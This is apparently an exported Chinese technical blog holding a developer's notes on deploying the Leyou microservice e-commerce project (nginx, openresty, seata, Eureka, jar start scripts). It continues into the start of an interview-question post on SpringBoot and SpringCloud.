<h3 id="brew-install-无法从ghcr-io-x2F-v2-x2F-homebrew-x2F-core下载安装，怎么解决？"><a href="#brew-install-无法从ghcr-io-x2F-v2-x2F-homebrew-x2F-core下载安装，怎么解决？" class="headerlink" title="brew install 无法从ghcr.io&#x2F;v2&#x2F;homebrew&#x2F;core下载安装，怎么解决？"></a>brew install 无法从ghcr.io&#x2F;v2&#x2F;homebrew&#x2F;core下载安装，怎么解决？</h3><p>原因是<code>Homebrew</code>的<code>bottles</code>文件迁移到了<code>GitHub Packages</code>，镜像地址需要调整。</p>
<p>同时也需要更新<code>Homebrew</code>到最新版。 </p>
<p>设置镜像源为中科大即可</p>
<h2 id="搭建机器学习环境"><a href="#搭建机器学习环境" class="headerlink" title="搭建机器学习环境"></a>搭建机器学习环境</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install virtualenv virtualenvwrapper</span><br><span class="line">pip3 install numpy</span><br><span class="line">pip3 install pandas</span><br><span class="line">pip3 install tables</span><br><span class="line">pip3 install matplotlib</span><br><span class="line">pip3 install --user jupyter</span><br><span class="line">python3 -m IPython notebook</span><br></pre></td></tr></table></figure>



<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="安装jdk8-3"><a href="#安装jdk8-3" class="headerlink" title="安装jdk8"></a>安装jdk8</h2><p>直接安装</p>
<h2 id="配置hosts-switchhost"><a href="#配置hosts-switchhost" class="headerlink" title="配置hosts(switchhost)"></a>配置hosts(switchhost)</h2><p>把hosts的只读选项去掉,然后在安全中更改用户权限即可使用switchhost</p>
<h2 id="配置vue环境"><a href="#配置vue环境" class="headerlink" title="配置vue环境"></a>配置vue环境</h2><p>在leyou-manage目录下打开dos: </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">安装node.js</span></span><br><span class="line">https://nodejs.org/en/download/</span><br><span class="line"><span class="meta">#</span><span class="language-bash">安装cnpm</span></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line"><span class="meta">#</span><span class="language-bash">安装vue-cli</span></span><br><span class="line">cnpm install -g vue-cli</span><br><span class="line">npm install</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<p>在leyou-portal目录下打开dos：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">执行项目初始化</span></span><br><span class="line">npm init -y</span><br><span class="line"><span class="meta">#</span><span class="language-bash">执行vue的安装</span></span><br><span class="line">npm install vue --save</span><br></pre></td></tr></table></figure>

<h2 id="安装centos-hmw版本"><a href="#安装centos-hmw版本" class="headerlink" title="安装centos-hmw版本"></a>安装centos-hmw版本</h2><p>设置桥接模式（192.168.58.154）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet</span><br><span class="line">PROXY_METHOD=none</span><br><span class="line">BROWSER_ONLY=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">DEFROUTE=yes</span><br><span class="line">IPV4_FAILURE_FATAL=no</span><br><span class="line">IPV6INIT=yes</span><br><span class="line">IPV6_AUTOCONF=yes</span><br><span class="line">IPV6_DEFROUTE=yes</span><br><span class="line">IPV6_FAILURE_FATAL=no</span><br><span class="line">IPV6_ADDR_GEN_MODE=stable-privacy</span><br><span class="line">NAME=ens33</span><br><span class="line">UUID=c5a33f9f-d3a8-456a-94b3-8a8218f50497</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.58.154</span><br><span class="line">PREFIX=24</span><br><span class="line">GATEWAY=192.168.58.1</span><br><span class="line">DNS1=119.29.29.29</span><br></pre></td></tr></table></figure>

<h1 id="windows-修改域名"><a href="#windows-修改域名" class="headerlink" title="windows 修改域名"></a>windows 修改域名</h1><p>centos-end版本(wl9939.top)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">cd /usr/resty</span><br><span class="line">nginx -p `pwd`/ -c conf/nginx.conf</span><br><span class="line"><span class="meta"># </span><span class="language-bash">先启动才能reload</span></span><br><span class="line">nginx -p `pwd` -c conf/nginx.conf -s reload</span><br><span class="line"><span class="meta">#</span><span class="language-bash">其中的-p主要是指明nginx启动时的配置目录；-c为 Nginx 指定一个配置文件，来代替缺省的。</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment">## seata</span></span></span><br><span class="line">cd seata/conf</span><br><span class="line">vi registry.conf</span><br><span class="line"></span><br><span class="line">registry &#123;</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">file 、nacos 、eureka、redis、zk、consul、etcd3、sofa</span></span><br><span class="line">  type = &quot;eureka&quot;</span><br><span class="line">  loadBalance = &quot;RandomLoadBalance&quot;</span><br><span class="line">  loadBalanceVirtualNodes = 10</span><br><span class="line">  eureka &#123;</span><br><span class="line"><span class="meta">  	# </span><span class="language-bash">seata-server 注册到这个注册中心</span></span><br><span class="line">    serviceUrl = &quot;http://registry.wl9939.top/eureka&quot;</span><br><span class="line">    # seata—server 在注册中心的名字</span><br><span class="line">    application = &quot;seata_service&quot;</span><br><span class="line">    weight = &quot;1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">使用文件方式配置seata</span></span><br><span class="line">config &#123;</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">file、nacos 、apollo、zk、consul、etcd3</span></span><br><span class="line">  type = &quot;file&quot;</span><br><span class="line">  file &#123;</span><br><span class="line">    name = &quot;file.conf&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi file.conf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># transaction log store, only used in seata-server</span></span></span><br><span class="line">store &#123;</span><br><span class="line"><span class="meta">  #</span><span class="language-bash"><span class="comment"># store mode: file、db、redis</span></span></span><br><span class="line">  mode = &quot;file&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash"><span class="comment"># file store property</span></span></span><br><span class="line">  file &#123;</span><br><span class="line">    ## store location dir</span><br><span class="line">    dir = &quot;sessionStore&quot;</span><br><span class="line">    # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions</span><br><span class="line">    maxBranchSessionSize = 16384</span><br><span class="line">    # globe session size , if exceeded throws exceptions</span><br><span class="line">    maxGlobalSessionSize = 512</span><br><span class="line">    # file buffer size , if exceeded allocate new buffer</span><br><span class="line">    fileWriteBufferCacheSize = 16384</span><br><span class="line">    # when recover batch read size</span><br><span class="line">    sessionReloadReadSize = 100</span><br><span class="line">    # async, sync</span><br><span class="line">    flushDiskMode = async</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">netstat -anp|grep 8091</span><br><span class="line">kill -9 </span><br><span class="line">cd</span><br><span class="line">cd seata/bin</span><br><span class="line"><span class="meta"># </span><span class="language-bash">后台运行</span></span><br><span class="line">nohup ./seata-server.sh -h 192.168.58.154 -p 8091 &gt;log.out 2&gt;1 &amp;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">代表在注册中心注册的地址 前台运行</span></span><br><span class="line">./seata-server.sh -h  -p 8091</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h2><p>修改cookie规则(在ly-common中)</p>
<p>修改gateway的跨域访问</p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line">        server_name www.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">        root  C:\Users\11253\WebstormProjects\leyou-portal;</span><br><span class="line">        &#125;</span><br><span class="line">        location /item &#123;</span><br><span class="line">                # 携带hosts地址，避免因代理导致host丢失</span><br><span class="line">                proxy_set_header Host       $host;</span><br><span class="line">						#openresty</span><br><span class="line">            proxy_pass   http://ly-resty;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  registry.wl9939.top;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-registry:10086;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  api.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-gateway:10010;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  manage.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-manage:9001;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Leyou-portal"><a href="#Leyou-portal" class="headerlink" title="Leyou-portal"></a>Leyou-portal</h2><p>修改域名</p>
<h2 id="leyou-manage"><a href="#leyou-manage" class="headerlink" title="leyou-manage"></a>leyou-manage</h2><p>修改域名</p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>image.leyou.com修改为image.wl9939.top</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> tb_sku</span><br><span class="line"><span class="keyword">set</span> images<span class="operator">=</span>REPLACE(images,images,concat(<span class="string">&#x27;http://image.wl9939.top/&#x27;</span>,<span class="built_in">SUBSTRing</span>(images <span class="keyword">from</span> <span class="number">24</span> <span class="keyword">FOR</span> LENGTH(images))))</span><br><span class="line"><span class="keyword">where</span> images</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;http://image.leyou.com%&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="清空es数据，然后重新load"><a href="#清空es数据，然后重新load" class="headerlink" title="清空es数据，然后重新load"></a>清空es数据，然后重新load</h2><h2 id="配置openresty"><a href="#配置openresty" class="headerlink" title="配置openresty"></a>配置openresty</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment">##openresty</span></span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">删除配置项</span><br><span class="line"></span><br><span class="line">vi /usr/resty/conf/leyou.conf</span><br><span class="line"><span class="meta">#</span><span class="language-bash">www.wl9939.top:8084为ly-page的地址</span> </span><br><span class="line">upstream backend &#123;</span><br><span class="line">    server www.wl9939.top:8084 max_fails=5 fail_timeout=10s weight=1;</span><br><span class="line">    keepalive 100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">        set $template_root &quot;/usr/resty/templates&quot;;</span><br><span class="line"></span><br><span class="line">    location ~ /backend/(.*) &#123;</span><br><span class="line">        #internal;</span><br><span class="line">        keepalive_timeout   30s;</span><br><span class="line">        keepalive_requests  1000;</span><br><span class="line">        #支持keep-alive</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Connection &quot;&quot;;</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">将路径重写为第一个正则捕获到的路径  /xxx/xxx</span></span><br><span class="line">        rewrite /backend(/.*) $1 break;</span><br><span class="line">        proxy_pass_request_headers off;</span><br><span class="line">        #more_clear_input_headers Accept-Encoding;</span><br><span class="line">        proxy_next_upstream error timeout;</span><br><span class="line">        proxy_pass http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">   location ~ /item/(\d+).html$ &#123;</span><br><span class="line">    # 获取路径参数</span><br><span class="line">    set $spuId $1;</span><br><span class="line">    # 禁止除了www.wl9939.top以外的请求访问</span><br><span class="line">    if ($host !~ &quot;^www\.wl9939\.top$&quot;) &#123;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line">    # 关闭缓存/打开缓存</span><br><span class="line">    lua_code_cache on;</span><br><span class="line">    default_type &#x27;text/html&#x27;;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    # 指定请求交给lua/item.lua脚本来处理</span><br><span class="line">    content_by_lua_file lua/item.lua;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /usr/resty/templates</span><br><span class="line">vi item.html</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启nginx</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span></span><br><span class="line">cd /usr/resty</span><br><span class="line">nginx -p `pwd`/ -c conf/nginx.conf</span><br><span class="line"><span class="meta"># </span><span class="language-bash">先启动才能reload</span></span><br><span class="line">nginx -p `pwd` -c conf/nginx.conf -s reload</span><br><span class="line"></span><br><span class="line">可能是dns问题，无法访问</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>centos连不上宿主机8084端口，一直处于syn_sent状态</p>
<p><strong>因为当时把page服务跑在了mac（192.168.58.153）上，所以这里会访问不到</strong>，一直处于syn_sent状态（耗时半天）</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149307.png" alt="image-20210627011101095"></p>
<h2 id="配置seata-h-，graylogs新ip重启"><a href="#配置seata-h-，graylogs新ip重启" class="headerlink" title="配置seata -h ，graylogs新ip重启"></a>配置seata -h ，graylogs新ip重启</h2><h2 id="启动jar包"><a href="#启动jar包" class="headerlink" title="启动jar包"></a>启动jar包</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">外部配置文件启动</span></span><br><span class="line">nohup java -jar -Dspring.config.location=./application.properties online_xdclass-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动jar脚本</span></span><br><span class="line">@echo off</span><br><span class="line">START &quot;app&quot; javaw -jar app-0.0.1-SNAPSHOT.jar</span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止jar脚本(如：jar包端口9090)</span></span><br><span class="line">@echo off</span><br><span class="line">set port=9090</span><br><span class="line">for /f &quot;tokens=1-5&quot; %%i in (&#x27;netstat -ano^|findstr &quot;:%port%&quot;&#x27;) do (</span><br><span class="line"> echo kill the process %%m who use the port </span><br><span class="line"> taskkill /pid %%m -t -f</span><br><span class="line"> goto q</span><br><span class="line">)</span><br><span class="line">:q</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启jar脚本(就是上面两个合起来)</span></span><br><span class="line">@echo off</span><br><span class="line">set port=9090</span><br><span class="line">for /f &quot;tokens=1-5&quot; %%i in (&#x27;netstat -ano^|findstr &quot;:%port%&quot;&#x27;) do (</span><br><span class="line"> echo kill the process %%m who use the port </span><br><span class="line"> taskkill /pid %%m -t -f</span><br><span class="line"> goto start</span><br><span class="line">)</span><br><span class="line">:start</span><br><span class="line">START &quot;app&quot; javaw -jar app-0.0.1-SNAPSHOT.jar</span><br><span class="line"></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> #</span><span class="language-bash">把这个脚本拷贝到自启动文件夹下</span>　</span><br><span class="line"> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp   （如果是脚本形式拷贝，要以管理员身份运行，负责拷贝不进去）</span><br></pre></td></tr></table></figure>

<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>page必须在<a href="http://www.wl9939.top/">www.wl9939.top</a>, 这个服务器上</p>
<h2 id="feign-RetryableException-Connection-refused-Connection-refused-executing"><a href="#feign-RetryableException-Connection-refused-Connection-refused-executing" class="headerlink" title="feign.RetryableException: Connection refused (Connection refused) executing"></a>feign.RetryableException: Connection refused (Connection refused) executing</h2><p>A服务访问B服务报错：feign.RetryableException: Connection refused (Connection refused) executing</p>
<p>原因：B服务注册到Ereka的时候，默认使用hostname注册，如果没有找到hostname就会用localhost</p>
<p>解决办法：使用ip注册</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">eureka:</span>	</span><br><span class="line">	<span class="attr">instance:</span></span><br><span class="line">  	<span class="attr">prefer-ip-address:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="Read-time-out"><a href="#Read-time-out" class="headerlink" title="Read-time out"></a>Read-time out</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ribbon:</span></span><br><span class="line">  <span class="attr">ConnectTimeout:</span> <span class="number">9000</span> <span class="comment"># ribbon链接超时时长,设置时间长一点就不会超时了</span></span><br><span class="line">  <span class="attr">ReadTimeout:</span> <span class="number">9000</span> <span class="comment"># ribbon读取超时时长</span></span><br></pre></td></tr></table></figure>

<h2 id="Springboot-整合swagger"><a href="#Springboot-整合swagger" class="headerlink" title="Springboot 整合swagger"></a>Springboot 整合swagger</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwaggerConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">createRestApi</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// DocumentationType.SWAGGER_2 固定的，代表swagger2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">                <span class="comment">// 如果配置多个文档的时候，那么需要配置groupName来分组标识</span></span><br><span class="line">                .groupName(<span class="string">&quot;分布式任务系统&quot;</span>)</span><br><span class="line">                <span class="comment">// 用于生成API信息</span></span><br><span class="line">                .apiInfo(apiInfo())</span><br><span class="line">                <span class="comment">// select()函数返回一个ApiSelectorBuilder实例,用来控制接口被swagger做成文档</span></span><br><span class="line">                .select()</span><br><span class="line">                <span class="comment">// 用于指定扫描哪个包下的接口</span></span><br><span class="line">                .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.leyou.sms.controller&quot;</span>))</span><br><span class="line">                <span class="comment">// 选择所有的API,如果你想只为部分API生成文档，可以配置这里</span></span><br><span class="line">                .paths(PathSelectors.any())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用于定义API主界面的信息，比如可以声明所有的API的总标题、描述、版本</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> api的基本信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>()</span><br><span class="line">                <span class="comment">//  可以用来自定义API的主标题</span></span><br><span class="line">                .title(<span class="string">&quot;短信服务API&quot;</span>)</span><br><span class="line">                <span class="comment">// 可以用来描述整体的API</span></span><br><span class="line">                .description(<span class="string">&quot;短信服务SwaggerAPI管理&quot;</span>)</span><br><span class="line">                <span class="comment">// 用于定义服务的域名</span></span><br><span class="line">                .termsOfServiceUrl(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="comment">// 可以用来定义版本。</span></span><br><span class="line">                .version(<span class="string">&quot;1.0.0&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="判断端口是否可以ping通"><a href="#判断端口是否可以ping通" class="headerlink" title="判断端口是否可以ping通"></a>判断端口是否可以ping通</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">python -m SimpleHTTPServer 8080</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">不存在的端口直接拒绝连接（windows）</span></span><br><span class="line">telnet 10.0.250.3 80</span><br><span class="line"><span class="meta">#</span><span class="language-bash">linux最常用</span></span><br><span class="line">ssh 10.0.250.3 -p 80</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用wget判断</span></span><br><span class="line">wget ip:port</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>项目相关面试题</title>
    <url>/2021/12/21/leyou/%E9%A1%B9%E7%9B%AE%E7%9B%B8%E5%85%B3%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="1-SpringBoot面试题"><a href="#1-SpringBoot面试题" class="headerlink" title="1.SpringBoot面试题"></a>1.SpringBoot面试题</h1><h2 id="1-1-SpringBoot的作用是什么"><a href="#1-1-SpringBoot的作用是什么" class="headerlink" title="1.1.SpringBoot的作用是什么?"></a>1.1.SpringBoot的作用是什么?</h2><p>答：采用默认配置，帮助我们快速的构建和运行Spring项目：</p>
<ul>
<li>用来简化spring初始搭建和开发过程使用特定的方式进行配置(properties或者yml文件)</li>
<li>创建独立的spring引用程序main方法运行</li>
<li>嵌入Tomcat无需部署war包，直接打成jar包nohup java -jar – &amp; 启动就好</li>
<li>简化了maven的配置</li>
<li>自动配置spring添加对应的starter自动化配置</li>
</ul>
<h2 id="1-2-SpringBoot的自动配置原理？"><a href="#1-2-SpringBoot的自动配置原理？" class="headerlink" title="1.2.SpringBoot的自动配置原理？"></a>1.2.SpringBoot的自动配置原理？</h2><p>SpringBoot项目的启动类都会有@SpringBootApplication注解，而这个注解的二级注解是@EnableAutoConfiguration注解。而@EnableAutoConfiguration注解通过@Import注解来导入各种在SpringBoot的jar包中或starter中写好的各种@Configuration声明的类。具体流程如下：</p>
<ul>
<li>@EnableAutoConfiguration通过@Import来导入配置</li>
<li>导入过程中，会利用classLoader读取META-INF&#x2F;spring.factories文件（key-value格式）中的数据</li>
<li>读取文件中以EnableAutoConfiguration为key的值，值就是Spring提供的，或我们引入的starter中的加了@Configuration的类，包括对spring、第三方库的各种配置。例如redis、elasticsearch、springmvc、mybatis等</li>
<li>对加载到的@Configuration类做过滤，分三步过滤：<ul>
<li>滤重</li>
<li>去除用户通过exclude排除的配置</li>
<li>去除不满足@ConditionalOnXX这样条件的配置</li>
</ul>
</li>
<li>将剩余的配置类实例化，完成自动配置加载</li>
</ul>
<p>这个过程中，我们可以通过自定义@Bean的方式，覆盖默认配置中已经完成的Bean。或者我们可以通过编写application.properties或者application.yml文件来覆盖默认配置中的属性值。</p>
<h2 id="1-3-有没有自定义过SpringBoot的stater？"><a href="#1-3-有没有自定义过SpringBoot的stater？" class="headerlink" title="1.3.有没有自定义过SpringBoot的stater？"></a>1.3.有没有自定义过SpringBoot的stater？</h2><p>有，项目中某些中间件的客户端（如Redis、ElasticSearch）会进行二次封装，并通过starter方式提供jar包，供大家使用。</p>
<p>一般定义starter包括下面几个子工程：</p>
<ul>
<li>xxx-spring-boot-starter：pom格式，管理当前starter中需要的各种依赖</li>
<li>xxx-spring-boot-autoconfigure：jar格式，编写@Configuration配置类，读取application.yml文件，实现默认配置</li>
</ul>
<h1 id="2-SpringCloud相关"><a href="#2-SpringCloud相关" class="headerlink" title="2.SpringCloud相关"></a>2.SpringCloud相关</h1><h2 id="2-0-微服务的优缺点"><a href="#2-0-微服务的优缺点" class="headerlink" title="2.0.微服务的优缺点"></a>2.0.微服务的优缺点</h2><p>微服务架构是一种架构模式或者说是一种架构风格，它提倡将单一应用程序划分为一组小服务，每个服务运行在自己的独立进程中，服务间通信采用轻量级通信机制(通常是基于 HTTP 的 RESTful API)。每个服务都围绕着具体业务进行构建，并且能够被独立地部署到生产环境、类生产环境等。另外，应该尽量避免统一的、集中式的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的语言来编写服务，也可以使用不同的数据存储技术。</p>
<ul>
<li>优点：<ul>
<li>易于开发和维护：一个微服务只会关注一个特定的业务功能，所以它业务清晰，代码量较少</li>
<li>单个微服务启动较快：单个微服务代码量较少，所以启动会比较快</li>
<li>业务之间松耦合，无论是在开发阶段或者部署阶段，不同的服务都是互相独立的</li>
<li>局部修改容易部署：单体应用只要有修改，就得重新部署整个应用，微服务解决了这样的问题</li>
<li>技术栈不受限：在微服务架构中，可以结合项目业务及团队的特点，合理地选择技术栈</li>
<li>按需伸缩：可根据需求，实现细粒度的扩展</li>
<li>只有业务逻辑的代码，不会和 HTML、CSS 或者其他前端页面耦合，目前有两种开发模式：前后端分离、全栈开发</li>
</ul>
</li>
<li>缺点：<ul>
<li>运维要求高：更多的服务意味着更多的运维投入</li>
<li>技术开发难度高：涉及到网络通信延迟、服务容错、数据一致性、系统集成测试、系统部署依赖、性能监控等</li>
<li>分布式系统固有的复杂性：使用微服务架构是分布式系统，对于一个分布式系统，系统容错，网络延迟，分布式事务等都会带来巨大的挑战</li>
<li>接口调整成本高：微服务之间通过接口进行通信。如果修改某一个微服务的 API，可能所有使用了该接口的微服务都需要做调整</li>
<li>重复劳动：很多服务可能都会使用到相同的功能，而这个功能并没有达到分解为一个微服务的程度，这个时候，可能各个服务都会开发这一功能，从而导致代码重复</li>
</ul>
</li>
</ul>
<h2 id="2-1-SpringCloud和Dubbo的区别"><a href="#2-1-SpringCloud和Dubbo的区别" class="headerlink" title="2.1.SpringCloud和Dubbo的区别"></a>2.1.SpringCloud和Dubbo的区别</h2><p>SpringCloud：Spring公司开源的微服务框架，SpirngCloud 定位为微服务架构下的一站式解决方案（微服务生态）</p>
<p>Dubbo：阿里巴巴开源的RPC框架，Dubbo 是 SOA 时代的产物，它的关注点主要在于服务的调用，流量分发、流量监控和熔断</p>
<table>
<thead>
<tr>
<th>功能</th>
<th>Dubbo</th>
<th>SpringCloud</th>
</tr>
</thead>
<tbody><tr>
<td>服务注册中心</td>
<td>Zookeeper、Redis</td>
<td>Spring Cloud Netfix Eureka</td>
</tr>
<tr>
<td>服务调用方式</td>
<td>RPC</td>
<td>REST API</td>
</tr>
<tr>
<td>服务监控</td>
<td>Dubbo-Monitor</td>
<td>Spring Boot Admin</td>
</tr>
<tr>
<td>熔断器</td>
<td>不完善</td>
<td>Spring Cloud Netflix Hystrix</td>
</tr>
<tr>
<td>服务网关</td>
<td>无</td>
<td>Spring Cloud Netflix Zuul</td>
</tr>
<tr>
<td>分布式配置</td>
<td>无</td>
<td>Spring Cloud Config</td>
</tr>
<tr>
<td>服务跟踪</td>
<td>无</td>
<td>Spring Cloud Sleuth</td>
</tr>
<tr>
<td>数据流</td>
<td>无</td>
<td>Spring Cloud Stream</td>
</tr>
<tr>
<td>批量任务</td>
<td>无</td>
<td>Spring Cloud Task</td>
</tr>
<tr>
<td>信息总线</td>
<td>无</td>
<td>Spring Cloud Bus</td>
</tr>
</tbody></table>
<p>Spring Cloud 的功能很明显比 Dubbo 更加强大，涵盖面更广，而且作为 Spring 的旗舰项目，它也能够与 Spring Framework、Spring Boot、Spring Data、Spring Batch 等其他 Spring 项目完美融合，这些对于微服务而言是至关重要的。</p>
<p>使用 Dubbo 构建的微服务架构就像组装电脑，各环节选择自由度很高，但是最终结果很有可能因为一条内存质量不行就点不亮了，总是让人不怎么放心，但是如果使用者是一名高手，那这些都不是问题。</p>
<p>而 Spring Cloud 就像品牌机，在 Spring Source 的整合下，做了大量的兼容性测试，保证了机器拥有更高的稳定性，但是如果要在使用非原装组件外的东西，就需要对其基础原理有足够的了解。</p>
